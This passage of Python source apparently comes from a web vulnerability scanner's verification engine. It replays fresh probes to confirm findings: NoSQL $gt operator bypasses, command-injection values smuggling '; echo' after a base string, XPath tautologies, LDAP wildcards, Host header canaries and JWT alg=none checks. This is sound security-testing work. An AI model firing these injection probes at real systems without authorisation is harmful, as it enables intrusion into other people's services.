                js_flip = (rj1 is not None and rj2 is not None and not rj1.error and not rj2.error
                           and rj1.ok and not rj2.ok)
                js_note = (f"fresh JS comparison vectors: TRUE -> {getattr(rj1, 'status', 0)} "
                           f"({len(getattr(rj1, 'body', '') or '')}B), FALSE -> "
                           f"{getattr(rj2, 'status', 0)} — the JS-evaluation flip reproduces")
                if js_flip:
                    v = Verification(method="oracle:js-or-2round", passed=js_flip,
                                     confidence=0.9, rounds=2, notes=js_note)
                    f.verification, f.confidence = v, v.confidence
                    f.status = FindingStatus.VERIFIED
                else:
                    # fallback: the Mongo error signature must reproduce on a
                    # fresh quote variant (VF-04 discipline: a DB-error STRING,
                    # never a bare 5xx)
                    from .detect import MONGO_ERR_PATTERNS
                    err_hit30 = None
                    for variant30 in (base30 + '"', base30 + "'"):
                        r30 = self._replay(ep, f.parameter, variant30)
                        if r30 is None or not r30.status:
                            continue
                        for pat30 in MONGO_ERR_PATTERNS:
                            m30 = pat30.search(r30.body or "")
                            if m30:
                                err_hit30 = f"{pat30.pattern[:40]} matched: {m30.group(0)[:60]}"
                                break
                        if err_hit30:
                            break
                    ok30 = err_hit30 is not None
                    v = Verification(method="error:mongo-replay-2variants", passed=ok30,
                                     confidence=0.85 if ok30 else 0.15, rounds=2,
                                     notes=(f"JS pair did not flip (TRUE "
                                            f"{getattr(rj1, 'status', 0)}/FALSE "
                                            f"{getattr(rj2, 'status', 0)}); quote variants "
                                            f"reproduce a Mongo error string: {ok30}"
                                            + (f" [{err_hit30}]" if err_hit30 else "")))
                    f.verification, f.confidence = v, v.confidence
                    f.status = FindingStatus.VERIFIED if ok30 else FindingStatus.REJECTED
                self.bus.emit("VerificationCompleted", finding=f.id, type=f.type,
                              passed=f.verification.passed if f.verification else False,
                              status=f.status.value, confidence=f.confidence)
                return f
            # VR-14 (v4.2.0 VF-02): the old oracle was `r.ok` on a single $gt
            # request — an endpoint answering 2xx to ANY body passed it vacuously.
            # The oracle is now a REPRODUCED FLIP: a fresh literal-credential
            # baseline must be REJECTED (4xx), then a FRESH operator ($gt,
            # independent of the detector's $ne) must flip the very same request
            # to ACCEPTED. The failure->success flip IS the injection mechanism;
            # reproducing it through a second operator is the proof.
            from .detect import NosqlDetector
            carrier14 = f.parameter or (next((p.name for p in ep.parameters
                                              if p.kind != ParamKind.TOKEN), "")
                                         if ep is not None else "")
            if ep is None or not carrier14:
                v = Verification(method="re-test:fresh-operator", passed=False,
                                 confidence=0.15, rounds=1,
                                 notes="no carrier parameter observable — cannot re-test")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.REJECTED
            else:
                r_base = self.engine.send(RequestMutation(
                    endpoint=ep, note="nosql-verify-baseline",
                    body_override=NosqlDetector._json_body(ep, carrier14, "burhan-vr14-wrong")))
                r_op = self.engine.send(RequestMutation(
                    endpoint=ep, note="nosql-verify",
                    body_override=NosqlDetector._json_body(ep, carrier14, {"$gt": ""})))
                base_rejected = (r_base is not None and not r_base.error and not r_base.ok)
                op_accepted = (r_op is not None and not r_op.error and r_op.ok)
                flip = base_rejected and op_accepted
                v = Verification(
                    method="re-test:fresh-operator", passed=flip,
                    confidence=0.9 if flip else 0.15, rounds=2,
                    notes=(f"literal credentials rejected (HTTP {r_base.status}), fresh $gt "
                           f"operator accepted (HTTP {r_op.status}) — the operator bypass "
                           "reproduces through an independent operator (failure->success flip)"
                           if flip else
                           f"flip not reproduced: literal baseline "
                           + ("rejected" if base_rejected else
                              f"ACCEPTED (HTTP {getattr(r_base, 'status', 0)})")
                           + f", $gt probe "
                           + ("accepted" if op_accepted else
                              f"rejected (HTTP {getattr(r_op, 'status', 0)})")))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if flip else FindingStatus.REJECTED

        elif f.type == "jwt_security":
            # VR-15 (Phase 55): fresh benign replay must issue another alg=none
            # token — reproducible unsigned issuance, not a one-off accident.
            from .detect import JwtDetector
            r15 = self.engine.send(RequestMutation(endpoint=ep, note="jwt-verify"))
            ok15 = False
            alg15 = ""
            if r15 is not None and not r15.error and r15.status:
                hay15 = (r15.body or "") + " ".join(f"{k}={v}" for k, v in (r15.headers or {}).items()
                                                    if k.lower() == "set-cookie")
                m15 = JwtDetector.TOKEN_RE.search(hay15)
                if m15:
                    hdr15 = JwtDetector._decode(m15.group(0).split(".")[0])
                    alg15 = str(hdr15.get("alg", "")).lower()
                    ok15 = alg15 == "none" and not m15.group(1)
            v = Verification(method="re-test:fresh-issuance", passed=ok15,
                             confidence=0.85 if ok15 else 0.15, rounds=1,
                             notes=f"fresh replay issued another unsigned token (alg={alg15!r}): {ok15}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok15 else FindingStatus.REJECTED

        elif f.type == "host_header_injection":
            # VR-16 (Phase 55): FRESH canary Host — reflection must repeat for a
            # never-probed host value.
            import hashlib as _hb16
            fresh16 = "burhan-vr16-" + _hb16.sha1(f.endpoint_url.encode()).hexdigest()[:10] + ".example"
            r16 = self.engine.send(RequestMutation(endpoint=ep, note="hostheader-verify",
                                                   extra_headers={"Host": fresh16}))
            ok16 = False
            if r16 is not None and not r16.error and r16.status:
                ok16 = fresh16 in (r16.body or "") or any(fresh16 in str(hv)
                                                          for hv in (r16.headers or {}).values())
            v = Verification(method="re-test:fresh-canary-host", passed=ok16,
                             confidence=0.85 if ok16 else 0.15, rounds=1,
                             notes=f"fresh canary host {fresh16} reflected: {ok16}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok16 else FindingStatus.REJECTED

        elif f.type == "credential_exposure":
            # VR-19 (Phase 56): a FRESH fetch of the endpoint must re-expose the
            # SAME credential class — reproducible exposure, not a one-off
            # accident (e.g. a transient error page that happened to contain a
            # key-shaped string).
            from .secrets import SecretsScanner
            r19 = self.engine.send(RequestMutation(endpoint=ep, note="secrets-verify"))
            ok19 = False
            if r19 is not None and not r19.error and r19.status:
                for cand in SecretsScanner().scan(ep, r19):
                    if cand.parameter == f.parameter:      # same credential class
                        ok19 = True
                        break
            v = Verification(method="re-test:fresh-fetch-reexposure", passed=ok19,
                             confidence=0.9 if ok19 else 0.15, rounds=1,
                             notes=f"fresh fetch re-exposed credential class "
                                   f"{f.parameter!r}: {ok19}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok19 else FindingStatus.REJECTED

        elif f.type == "command_injection" and any(e.kind == "shell_arithmetic" for e in f.evidence):
            # VR-21 (GTP-04): response-oracle command injection — a FRESH
            # arithmetic expression (different shape, same result) must
            # compute again on replay. An escaped/encoded input can only ever
            # echo the literal, never the value; the base must stay clean.
            from .detect import CmdiEchoDetector
            _expr = CmdiEchoDetector.EXPRS[2]
            if ep is None:
                v = Verification(method="re-test:fresh-expression", passed=False, confidence=0.15,
                                 rounds=0, notes="no endpoint for replay")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.REJECTED
            else:
                _p21 = f.parameter or next((p.name for p in ep.parameters
                                            if p.kind != ParamKind.TOKEN and not p.flow_control), "")
                rb = self.engine.send(RequestMutation(endpoint=ep, param_name=_p21,
                                                      param_value="burhan-vr21-base", note="vr21-base"))
                rr = self.engine.send(RequestMutation(endpoint=ep, param_name=_p21,
                                                      param_value="burhan-vr21-base; echo " + _expr,
                                                      note="vr21-echo"))
                ok21 = (rb is not None and rr is not None and not rb.error and not rr.error
                        and "42" not in (rb.body or "") and "42" in (rr.body or ""))
                v = Verification(method="re-test:fresh-expression", passed=ok21,
                                 confidence=0.9 if ok21 else 0.15, rounds=2,
                                 notes=(f"fresh expression {_expr} -> 42 reproduced on replay "
                                        "(base clean)" if ok21 else "computed output not reproduced"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok21 else FindingStatus.REJECTED

        elif f.type == "command_injection" and any(e.kind == "env_arithmetic" for e in f.evidence):
            # VR-21b (GTP-04b, round 2): ENV-ARRAY replay — a fresh expression in
            # the FOO= form must compute again; the FOO=<literal> base must stay
            # clean. An escaped/encoded env string can only echo the literal.
            from .detect import CmdiEchoDetector as _CE
            _expr_b = _CE.EXPRS[2]
            if ep is None:
                v = Verification(method="re-test:fresh-env-expression", passed=False,
                                 confidence=0.15, rounds=0, notes="no endpoint for replay")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.REJECTED
            else:
                _p21b = f.parameter or next((p.name for p in ep.parameters
                                             if p.kind != ParamKind.TOKEN and not p.flow_control), "")
                env21 = _CE.ENV_NAMES[0]
                rb = self.engine.send(RequestMutation(endpoint=ep, param_name=_p21b,
                                                      param_value=f"{env21}=echo burhan-vr21b-base",
                                                      note="vr21b-base"))
                rr = self.engine.send(RequestMutation(endpoint=ep, param_name=_p21b,
                                                      param_value=f"{env21}=echo {_expr_b}",
                                                      note="vr21b-echo"))
                ok21b = (rb is not None and rr is not None and not rb.error and not rr.error
                         and "42" not in (rb.body or "") and "42" in (rr.body or ""))
                v = Verification(method="re-test:fresh-env-expression", passed=ok21b,
                                 confidence=0.9 if ok21b else 0.15, rounds=2,
                                 notes=(f"fresh env expression {env21}=echo {_expr_b} -> 42 "
                                        "reproduced (env base clean)" if ok21b else
                                        "env-form computed output not reproduced"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok21b else FindingStatus.REJECTED

        elif f.type == "command_injection" and any(e.kind == "argv_echo" for e in f.evidence):
            # VR-29 (GTP-04b, round 2): DIRECT-EXEC replay — a fresh canary as
            # the whole value must produce standalone canary output again
            # (canary present, 'echo <canary>' absent — a reflection carries
            # the full payload text; an exec output does not).
            from .detect import CmdiEchoDetector as _CD
            c3 = "burhanargvmark3"
            if ep is None:
                v = Verification(method="re-test:fresh-argv-canary", passed=False,
                                 confidence=0.15, rounds=0, notes="no endpoint for replay")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.REJECTED
            else:
                _p29 = f.parameter or next((p.name for p in ep.parameters
                                            if p.kind != ParamKind.TOKEN and not p.flow_control), "")
                r29 = self._replay(ep, _p29, f"echo {c3}")
                b29 = (r29.body or "") if (r29 is not None and not r29.error) else ""
                ok29 = (c3 in b29 and ("echo " + c3) not in b29)
                v = Verification(method="re-test:fresh-argv-canary", passed=ok29,
                                 confidence=0.85 if ok29 else 0.15, rounds=1,
                                 notes=(f"fresh canary produced standalone argv output "
                                        f"('echo {c3}' text absent)" if ok29 else
                                        "fresh canary did not reproduce standalone output"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok29 else FindingStatus.REJECTED

        elif f.type == "xpath_injection":
            # VR-22 (GTP-05): fresh tautology/contradiction pair must
            # reproduce the result-set differential.
            from .detect import XPathDetector
            if ep is None:
                v = Verification(method="re-test:fresh-pair", passed=False, confidence=0.15,
                                 rounds=0, notes="no endpoint for replay")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.REJECTED
            else:
                _p22 = f.parameter or next((p.name for p in ep.parameters
                                            if p.kind != ParamKind.TOKEN and not p.flow_control), "")
                rt = self.engine.send(RequestMutation(endpoint=ep, param_name=_p22,
                                                      param_value=XPathDetector.TRUE_PAYLOADS[1], note="vr22-true"))
                rf = self.engine.send(RequestMutation(endpoint=ep, param_name=_p22,
                                                      param_value=XPathDetector.FALSE_PAYLOADS[1], note="vr22-false"))
                ok22 = (rt is not None and rf is not None and not rt.error and not rf.error
                        and rt.ok and rf.ok and rt.status == rf.status
                        and (len(rt.body or "") > len(rf.body or "") + 120
                             or len(rt.body or "") > (len(rf.body or "")) * 1.5 + 30))
                v = Verification(method="re-test:fresh-pair", passed=ok22,
                                 confidence=0.85 if ok22 else 0.15, rounds=2,
                                 notes=("fresh tautology/contradiction pair reproduced the "
                                        "result-set differential" if ok22 else
                                        "differential not reproduced on fresh literals"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok22 else FindingStatus.REJECTED

        elif f.type == "ldap_injection":
            # VR-23 (GTP-06): a fresh wildcard shape must reproduce the
            # record-count explosion.
            from .detect import LdapDetector
            if ep is None:
                v = Verification(method="re-test:fresh-wildcard", passed=False, confidence=0.15,
                                 rounds=0, notes="no endpoint for replay")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.REJECTED
            else:
                _p23 = f.parameter or next((p.name for p in ep.parameters
                                            if p.kind != ParamKind.TOKEN and not p.flow_control), "")
                rb = self.engine.send(RequestMutation(endpoint=ep, param_name=_p23,
                                                      param_value="burhan-vr23-base", note="vr23-base"))
                rw = self.engine.send(RequestMutation(endpoint=ep, param_name=_p23,
                                                      param_value="*", note="vr23-wild"))
                cb = len(LdapDetector.RECORD_MARK.findall(rb.body or "")) if (rb and not rb.error) else 0
                cw = len(LdapDetector.RECORD_MARK.findall(rw.body or "")) if (rw and not rw.error) else 0
                ok23 = cw >= max(2, cb + 2)
                v = Verification(method="re-test:fresh-wildcard", passed=ok23,
                                 confidence=0.85 if ok23 else 0.15, rounds=2,
                                 notes=(f"fresh wildcard shape reproduced the record explosion "
                                        f"({cw} vs {cb})" if ok23 else
                                        "wildcard differential not reproduced"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok23 else FindingStatus.REJECTED

        elif f.type == "secure_cookie":
            # VR-24 (GTP-07): a fresh fetch must set the same cookie class
            # without the Secure attribute again.
            from .detect import SecureCookieDetector
            r24 = self.engine.send(RequestMutation(endpoint=ep, note="vr24")) if ep is not None else None
            ok24 = False
            if r24 is not None and not r24.error and r24.status:
                raw = (r24.headers or {}).get("set-cookie") or ""
                for chunk in re.split(r",(?=\s*[A-Za-z0-9_\-]+=)", raw):
                    m = re.match(r"\s*([^=;,\s]+)\s*=", chunk)
                    # GTP-07b: same token-level Secure check as the detector — the
                    # whole-string 'secure' test saw the substring in the Path VALUE
                    # (/benchmark/securecookie-NN/...) and every replay 'passed'.
                    toks24 = [t.strip().lower() for t in chunk.split(";")[1:]]
                    if m and m.group(1) == f.parameter and "secure" not in toks24:
                        ok24 = True
                        break
            v = Verification(method="re-test:fresh-fetch-attribute", passed=ok24,
                             confidence=0.85 if ok24 else 0.15, rounds=1,
                             notes=f"fresh fetch re-set cookie {f.parameter!r} without Secure: {ok24}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok24 else FindingStatus.REJECTED

        elif f.type == "trust_bound":
            # VR-25 (GTP-08): a FRESH marker must reflect through the same
            # channel on replay. TB-1a/1b/1c (trustbound recall round): the
            # battery records the firing channel AND variant in an
            # input_channel evidence entry — a value-mutation replay probes a
            # channel the app never reads (the exact 51-FN root cause on the
            # OWASP Benchmark), and a PLAIN replay dies on a mangle sink (the
            # marker's own last char is eaten; only the sacrificial-tail
            # replay survives — the XS-2 discipline).
            from .detect import TrustBoundDetector, last_path_segment
            ok25 = False
            if ep is not None:
                m3 = "burhantb3verify"
                _nc25 = next((e for e in (f.evidence or [])
                              if e.kind == "input_channel"), None)
                _chan25 = ((_nc25.detail or "") if _nc25 is not None else "")
                _tail25 = "zz" if "variant=tail" in _chan25 else ""
                if _chan25.startswith("channel=selfnamed") \
                        or _chan25.startswith("channel=param"):
                    _anchor25 = (_chan25.split("anchor=")[1].split(" ")[0]
                                 if "anchor=" in _chan25 else "")
                    r25 = self.engine.send(RequestMutation(
                        endpoint=ep, param_name=_anchor25, param_value=m3 + _tail25,
                        note="vr25-sn")) if _anchor25 else None
                elif _chan25.startswith("channel=segment_name") \
                        or _chan25.startswith("channel=resolver_name"):
                    # TB-3a: the fresh marker rides the param NAME with the
                    # basename burhan as the value (the resolver shape)
                    _anchor25 = (_chan25.split("anchor=")[1].split(" ")[0]
                                 if "anchor=" in _chan25 else "")
                    r25 = self.engine.send(RequestMutation(
                        endpoint=ep, param_name=m3 + _tail25, param_value=_anchor25,
                        note="vr25-mn")) if _anchor25 else None
                elif _chan25.startswith("channel=header_tcid"):
                    # TB-3b: the fresh marker rides the header named after
                    # the endpoint's own basename (VALUE channel)
                    from .core import ParamLocation as _PL25
                    _anchor25 = (_chan25.split("anchor=")[1].split(" ")[0]
                                 if "anchor=" in _chan25 else "")
                    r25 = self.engine.send(RequestMutation(
                        endpoint=ep, param_name=_anchor25, param_value=m3 + _tail25,
                        param_location=_PL25.HEADER,
                        note="vr25-ht")) if _anchor25 else None
                elif _chan25.startswith("channel=cookie"):
                    # TB-3c: the fresh marker rides the cookie named after
                    # the endpoint's own basename
                    from .core import ParamLocation as _PL25c
                    _anchor25 = (_chan25.split("anchor=")[1].split(" ")[0]
                                 if "anchor=" in _chan25 else "")
                    r25 = self.engine.send(RequestMutation(
                        endpoint=ep, param_name=_anchor25, param_value=m3 + _tail25,
                        param_location=_PL25c.COOKIE,
                        note="vr25-ck")) if _anchor25 else None
                elif _chan25.startswith("channel=headername"):
                    # TB-1b: the fresh marker rides a request header NAME — on
                    # the same header-params-dropped clone the detector used
                    # (a declared non-standard header param would win the
                    # first-non-standard race and kill the replay)
                    from .detect import _clone_ep_drop_header_params as _dp25
                    r25 = self.engine.send(RequestMutation(
                        endpoint=_dp25(ep), extra_headers={m3 + _tail25: "1"},
                        note="vr25-hn"))
                elif ep.parameters:
                    _p25 = next((p.name for p in ep.parameters
                                 if p.kind != ParamKind.TOKEN and not p.flow_control), None)
                    r25 = self.engine.send(RequestMutation(endpoint=ep, param_name=_p25,
                                                           param_value=m3, note="vr25")) if _p25 else None
                else:
                    seg = last_path_segment(ep.url)
                    r25 = self.engine.send(RequestMutation(endpoint=ep, param_name=m3,
                                                           param_value=seg, note="vr25n")) if seg else None
                # the UNTAILED needle check: a tailed replay reflects m3+'z'
                # (the mangle ate one tail char) — m3 itself survives verbatim
                ok25 = bool(r25 is not None and not r25.error and m3 in (r25.body or ""))
            v = Verification(method="re-test:fresh-marker", passed=ok25,
                             confidence=0.7 if ok25 else 0.15, rounds=1,
                             notes=f"fresh marker reflected on replay: {ok25}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok25 else FindingStatus.REJECTED

        elif f.type == "weak_random":
            # VR-26 (GTP-09): re-run the full break with FRESH samples —
            # chain prediction must predict again, or the seed relation must
            # hold again across a fresh triple.
            # GTP-09b (wave 3, live-caught on the mini-scan): the phase
            # candidates arrive with ep=None (the orchestrator's phase loop
            # passes None) — the old `_eps = [ep] if ep is not None` left the
            # re-run with NO endpoint and rejected EVERY candidate. Resolve
            # the endpoint from the finding itself (the phase's fetch works
            # on a bare Endpoint — proven standalone, killed only here).
            from .weakrand import WeakRandomPhase
            from .core import Endpoint as _Ep26
            _ep26 = ep
            if _ep26 is None and f.endpoint_url:
                _ep26 = _Ep26(url=f.endpoint_url, method=(f.method or "POST"))
            _wp = WeakRandomPhase(self.engine, self.bus)
            _eps = [_ep26] if _ep26 is not None else []
            ok26 = bool(_wp.run(_eps, [])[0:1]) if _eps else False
            v = Verification(method="re-test:fresh-break", passed=ok26,
                             confidence=0.95 if ok26 else 0.15, rounds=1,
                             notes=("the generator broke again on fresh samples (prediction/"
                                    "relation reproduced)" if ok26 else
                                    "the fresh-sample break did not reproduce"))
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok26 else FindingStatus.REJECTED

        elif f.type == "weak_hash":
            # VR-27 (GTP-10, GTP-12c): re-execute the chain with a FRESH marker
            # through a TRUNCATED artifact window — the artifact's new line
            # must match the locally computed weak digest again (exact
            # cryptographic match, zero-FP by construction).
            # GTP-12h: the digest_length_const family replays the CONSTANT
            # oracle instead — two distinct inputs must reproduce the SAME
            # 16/20-byte line.
            import base64 as _b64, hashlib as _hl
            ok27 = False
            _kinds27 = {e.kind for e in f.evidence}
            recipe = self._chain_recipe(f)
            if "digest_length_const" in _kinds27 and recipe:
                _c1 = None
                _c2 = None
                if recipe.get("truncate_url"):
                    if self._chain_truncate(recipe) is not None:
                        self._chain_write(f, ep, recipe, "vr27-const-A")
                        from .detect import entity_normalize as _en27c
                        body = _en27c(self._chain_read(recipe))
                        i = body.find("hash_value=")
                        if i >= 0:
                            seg = body[i + len("hash_value="):]
                            m27c = re.search(r"\n\s*\w+=", seg)
                            if m27c:
                                seg = seg[:m27c.start()]
                            seg = re.sub(r"\s+", "", seg)
                            try:
                                _c1 = _b64.b64decode(seg + "=" * (-len(seg) % 4))
                            except Exception:
                                _c1 = None
                    if _c1 is not None and self._chain_truncate(recipe) is not None:
                        self._chain_write(f, ep, recipe, "vr27-const-B-different")
                        from .detect import entity_normalize as _en27d
                        body = _en27d(self._chain_read(recipe))
                        i = body.find("hash_value=")
                        if i >= 0:
                            seg = body[i + len("hash_value="):]
                            m27d = re.search(r"\n\s*\w+=", seg)
                            if m27d:
                                seg = seg[:m27d.start()]
                            seg = re.sub(r"\s+", "", seg)
                            try:
                                _c2 = _b64.b64decode(seg + "=" * (-len(seg) % 4))
                            except Exception:
                                _c2 = None
                ok27 = (_c1 is not None and _c2 is not None and _c1 == _c2
                        and len(_c1) in (16, 20))
                v = Verification(method="re-test:fresh-const-digest", passed=ok27,
                                 confidence=0.85 if ok27 else 0.15, rounds=1,
                                 notes=("two distinct fresh inputs reproduced the SAME "
                                        f"{None if _c1 is None else len(_c1)}-byte digest line "
                                        "(input-independent, MD/SHA-1 family length)" if ok27
                                        else "the constant-digest family did not reproduce"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok27 else FindingStatus.REJECTED
            else:
                if recipe:
                    K2 = "burhan-vr27-K2"
                    if recipe.get("truncate_url"):
                        # GTP-12c: deterministic window — truncate, write, read;
                        # everything in the read is the fresh marker's.
                        # GTP-12g(h): a FAILED truncate aborts — a stale window
                        # reads the previous probe's line
                        if self._chain_truncate(recipe) is None:
                            new_lines = []
                            r27 = None
                        else:
                            r27 = self._chain_write(f, ep, recipe, K2)
                        after = self._chain_read(recipe)
                        new_lines = after.splitlines() if (r27 is not None and not r27.error) else []
                    else:
                        before = self._chain_read(recipe)
                        r27 = self._chain_write(f, ep, recipe, K2)
                        after = self._chain_read(recipe)
                        if r27 is None or r27.error:
                            new_lines = []
                        else:
                            from collections import Counter as _C27
                            _cb, _ca = Counter(before.splitlines()), Counter(after.splitlines())
                            new_lines = [ln for ln, n in _ca.items()
                                         for _ in range(n - _cb.get(ln, 0)) if n > _cb.get(ln, 0)]
                    md5v = _hl.md5(K2.encode()).digest()
                    sha1v = _hl.sha1(K2.encode()).digest()
                    from .detect import entity_normalize as _en27
                    for ln in new_lines:
                        m = re.search(r"hash_value=([A-Za-z0-9+/=]+)", _en27(ln))
                        if not m:
                            continue
                        try:
                            d = _b64.b64decode(m.group(1))
                        except Exception:
                            continue
                        if d in (md5v, sha1v):
                            ok27 = True
                            break
                v = Verification(method="re-test:fresh-chain", passed=ok27,
                                 confidence=0.9 if ok27 else 0.15, rounds=1,
                                 notes=("fresh marker re-entered the artifact and the locally "
                                        "computed weak digest matched again" if ok27 else
                                        "chain not reproduced on fresh marker"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok27 else FindingStatus.REJECTED

        elif f.type == "weak_crypto":
            # VR-28 (GTP-10, GTP-12c): fresh plaintexts through the chain —
            # the weak block class must reproduce through the SAME tier
            # logic the detector used (direct 24B signature, the all-mod-8
            # +8-step block signature on stream surfaces, or the ECB repeat).
            import base64 as _b64
            ok28 = False
            used28 = ""
            recipe = self._chain_recipe(f)
            _kinds28 = {e.kind for e in f.evidence}
            if "constant_block_oracle" in _kinds28 and recipe:
                # CR-3 (crypto recall round): replay the CONSTANT oracle — two
                # DISTINCT fresh inputs must reproduce the SAME input-independent
                # ciphertext length L, the SAME echoed constant C, and the pad8
                # shape L == (len(C)//8+1)*8 with len(C) % 8 != 0 (the full-pad
                # zone is excluded — GCM/CCM tag lengths collide there).
                _C0 = recipe.get("constant") or ""
                _cts28, _echos28 = [], []
                for _v28 in ("vr28-const-A", "vr28-const-B-different"):
                    if recipe.get("truncate_url"):
                        if self._chain_truncate(recipe) is None:
                            break
                        r28c = self._chain_write(f, ep, recipe, _v28)
                        if r28c is None or r28c.error:
                            break
                        from .detect import entity_normalize as _en28c
                        _m28c = re.search(r"Sensitive value: '([^']*)'",
                                          _en28c(r28c.body or ""))
                        if _m28c:
                            _echos28.append(_m28c.group(1))
                        body = _en28c(self._chain_read(recipe))
                        i = body.find("secret_value=")
                        if i < 0:
                            break
                        seg = body[i + len("secret_value="):]
                        m28d = re.search(r"\n\s*\w+=", seg)
                        if m28d:
                            seg = seg[:m28d.start()]
                        seg = re.sub(r"\s+", "", seg)
                        try:
                            _cts28.append(_b64.b64decode(seg + "=" * (-len(seg) % 4)))
                        except Exception:
                            break
                    else:
                        break
                ok28 = (len(_cts28) == 2 and _cts28[0] is not None and _cts28[1] is not None
                        and len(_cts28[0]) == len(_cts28[1])
                        and len(_echos28) == 2 and _echos28[0] == _echos28[1]
                        and _echos28[0] == _C0 and _C0
                        and len(_C0) % 8 != 0
                        and len(_cts28[0]) == (len(_C0) // 8 + 1) * 8)
                v = Verification(method="re-test:fresh-const-block", passed=ok28,
                                 confidence=0.85 if ok28 else 0.15, rounds=1,
                                 notes=(f"two distinct fresh inputs reproduced the SAME "
                                        f"{len(_cts28[0]) if _cts28 else 0}-byte input-independent "
                                        f"ciphertext and the SAME echoed constant "
                                        f"'{_C0}' (pad8 shape, non-full-pad zone)" if ok28
                                        else "the constant-block family did not reproduce"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok28 else FindingStatus.REJECTED
            elif recipe:
                from .detect import entity_normalize as _en28
                def _fresh_ct(value: str) -> bytes | None:
                    if recipe.get("truncate_url"):
                        # GTP-12g(h): abort on a failed truncate (stale window)
                        if self._chain_truncate(recipe) is None:
                            return None
                        r28 = self._chain_write(f, ep, recipe, value)
                        if r28 is None or r28.error:
                            return None
                        body = _en28(self._chain_read(recipe))
                        i = body.find("secret_value=")
                        if i < 0:
                            return None
                        seg = body[i + len("secret_value="):]
                        m28 = re.search(r"\n\s*\w+=", seg)
                        if m28:
                            seg = seg[:m28.start()]
                        seg = re.sub(r"\s+", "", seg)
                        try:
                            return _b64.b64decode(seg + "=" * (-len(seg) % 4))
                        except Exception:
                            return None
                    before = self._chain_read(recipe)
                    r28 = self._chain_write(f, ep, recipe, value)
                    after = self._chain_read(recipe)
                    if r28 is None or r28.error:
                        return None
                    from collections import Counter as _C28
                    _cb, _ca = Counter(before.splitlines()), Counter(after.splitlines())
                    for ln in [l for l, n in _ca.items()
                               for _ in range(n - _cb.get(l, 0)) if n > _cb.get(l, 0)]:
                        m = re.search(r"secret_value=([A-Za-z0-9+/=]+)", _en28(ln))
                        if not m:
                            continue
                        try:
                            return _b64.b64decode(m.group(1))
                        except Exception:
                            continue
                    return None
                ct16 = _fresh_ct("B" * 16)
                if ct16 is not None:
                    if len(ct16) == 24:
                        # GTP-12g: the off-boundary probe must confirm a BLOCK
                        # cipher (15B plaintext still answers a multiple of 8) —
                        # AES/GCM with an 8-byte tag collides with the bare
                        # 16/24/32 curve and false-verified 25 secure servlets
                        ct15 = _fresh_ct("B" * 15)
                        if ct15 is not None and len(ct15) % 8 == 0:
                            ok28, used28 = True, (f"16B -> 24B + 15B -> {len(ct15)}B "
                                                  "off-boundary block multiple (8-byte block)")
                    if not ok28:
                        ct8 = _fresh_ct("B" * 8)
                        ct24 = _fresh_ct("B" * 24)
                        if ct8 is not None and ct24 is not None and ct8 != ct16 \
                                and len(ct8) % 8 == 0 and len(ct16) % 8 == 0 \
                                and len(ct24) % 8 == 0 \
                                and len(ct16) - len(ct8) == 8 and len(ct24) - len(ct16) == 8:
                            ct15 = _fresh_ct("B" * 15)
                            if ct15 is not None and len(ct15) % 8 == 0:
                                ok28, used28 = True, (f"block-step 8/16/24 + 15B -> "
                                                      f"{len(ct15)}B off-boundary multiple")
                        if not ok28:
                            ct64 = _fresh_ct("B" * 64)
                            if ct64 is not None and len(ct64) >= 24:
                                for bs in (8, 16):
                                    bl = [ct64[i:i + bs] for i in range(0, len(ct64) - bs + 1, bs)]
                                    if len(ct64) % bs == 0 and len(bl) != len(set(bl)):
                                        ok28, used28 = True, f"ECB repeat ({bs}B blocks)"
                                        break
            v = Verification(method="re-test:fresh-chain", passed=ok28,
                             confidence=0.85 if ok28 else 0.15, rounds=1,
                             notes=(f"fresh plaintext reproduced the weak block class "
                                    f"({used28})" if ok28 else
                                    "block-size class not reproduced"))
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok28 else FindingStatus.REJECTED

        elif f.type in _PRESENCE_VERIFIED_TYPES:
            # VF-01 (v4.2.0): explicit allowlist — the ONLY types that may be
            # VERIFIED without a replay. Single-response presence IS the whole
            # evidence class for these (a missing header cannot be "replayed"
            # into existence). Confidence is drastically lowered from the old
            # 0.98 — which was the HIGHEST in the engine, above every replayed
            # class — to 0.70, far below every replay-verified class.
            v = Verification(method="single-response-evidence", passed=True, confidence=0.70, rounds=1,
                             notes="presence-based proof (weakest evidence class in the engine): "
                                   "established from ONE response — no replay oracle exists "
                                   "for this class by nature")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED
        elif f.type == "jwt_algorithm_confusion":
            # VR-29 (axis 13): a FRESH end-to-end differential — fresh harvest,
            # fresh key discovery, a fresh forged pair; the flip must reproduce.
            from .modernsec import replay_confusion, recipe_of
            ok29, notes29 = replay_confusion(self.engine, f)
            v = Verification(method="re-test:fresh-confusion-differential",
                             passed=ok29, confidence=0.9 if ok29 else 0.15,
                             rounds=2, notes=notes29)
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok29 else FindingStatus.REJECTED

        elif f.type in ("shadow_api_endpoint", "zombie_api_endpoint"):
